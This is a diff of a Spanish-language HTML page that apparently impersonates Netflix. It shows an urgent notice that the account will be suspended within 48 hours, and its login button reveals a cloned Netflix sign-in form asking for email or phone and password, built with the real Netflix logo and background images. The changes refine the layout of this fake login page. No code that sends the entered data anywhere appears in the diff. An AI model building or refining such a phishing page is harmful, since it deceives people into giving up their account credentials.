@@ -24,6 +24,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            position: relative;
         }
 
         .nl-container {
@@ -91,9 +92,8 @@
             box-shadow: 0 6px 18px rgba(246, 18, 29, 0.8);
         }
 
-        /* Estilos del segundo documento (sección de inicio de sesión) */
+        /* Estilos para la página de inicio de sesión (segundo documento) */
         .login-page {
-            /* Oculto por defecto */
             display: none;
             position: relative;
             z-index: 2;
@@ -106,7 +106,24 @@
             box-sizing: border-box;
             color: #fff;
         }
+        
+        .login-page-container {
+            display: none; /* Oculto por defecto */
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 450px;
+        }
 
+        .login-page-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 3;
+            width: 100px;
+            display: none; /* Oculto por defecto */
+        }
+        
         .login-title {
             font-size: 1.6em;
             font-weight: bold;
@@ -287,7 +304,10 @@
 
         /* Estilos Responsive para el segundo documento (sección de inicio de sesión) */
         @media (max-width: 480px) {
-            .login-page {
+            body {
+                background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
+            }
+            .login-page-container {
                 align-items: flex-start;
                 padding-top: 80px;
             }
@@ -327,7 +347,6 @@
                             Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
                         </div>
                         <div class="button-block">
-                            <!-- Se ha modificado este botón para llamar a una función de JavaScript -->
                             <a href="#" onclick="showLoginPage(); return false;">Iniciar sesión</a>
                         </div>
                     </td>
@@ -336,49 +355,50 @@
         </table>
     </div>
 
-    <!-- Contenedor para la página de inicio de sesión, inicialmente oculta -->
-    <div id="login-page" class="login-page">
-        <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo">
-        </div>
-        <div class="login-container">
-            <h1 class="login-title">Iniciar sesión</h1>
-            <form>
-                <div class="form-group">
-                    <input type="text" placeholder="Email o número de celular">
-                </div>
-                <div class="form-group">
-                    <input type="password" placeholder="Contraseña">
-                </div>
-                <button type="submit" class="login-btn">Iniciar sesión</button>
-                <div class="options-divider">O</div>
-                <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
-                <div class="remember-help-flex">
-                    <div class="remember-me">
-                        <input type="checkbox" id="remember">
-                        <label for="remember">Recordarme</label>
+    <!-- Contenedor para la página de inicio de sesión, que contiene el logo en la esquina y el formulario centrado -->
+    <div id="login-page-container" class="login-page-container">
+        <!-- Logo de la página de inicio de sesión, posicionado en la esquina superior izquierda -->
+        <img id="login-page-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="login-page-logo">
+
+        <!-- Contenedor del formulario de inicio de sesión -->
+        <div class="login-page">
+            <div class="login-container">
+                <h1 class="login-title">Iniciar sesión</h1>
+                <form>
+                    <div class="form-group">
+                        <input type="text" placeholder="Email o número de celular">
                     </div>
-                    <div class="help-options">
-                        <a href="#">¿Olvidaste la contraseña?</a>
+                    <div class="form-group">
+                        <input type="password" placeholder="Contraseña">
                     </div>
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+                    <div class="options-divider">O</div>
+                    <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
+                    <div class="remember-help-flex">
+                        <div class="remember-me">
+                            <input type="checkbox" id="remember">
+                            <label for="remember">Recordarme</label>
+                        </div>
+                        <div class="help-options">
+                            <a href="#">¿Olvidaste la contraseña?</a>
+                        </div>
+                    </div>
+                </form>
+                <div class="signup-section">
+                    <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
                 </div>
-            </form>
-            <div class="signup-section">
-                <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
-            </div>
-            <div class="recaptcha-section">
-                <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
+                <div class="recaptcha-section">
+                    <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
+                </div>
             </div>
         </div>
     </div>
     
     <script>
-        // Función de JavaScript para cambiar de página
         function showLoginPage() {
-            // Oculta la página de notificación
             document.getElementById('notification-page').style.display = 'none';
-            // Muestra la página de inicio de sesión
-            document.getElementById('login-page').style.display = 'block';
+            document.getElementById('login-page-container').style.display = 'flex';
+            document.getElementById('login-page-logo').style.display = 'block';
         }
     </script>
 </body>
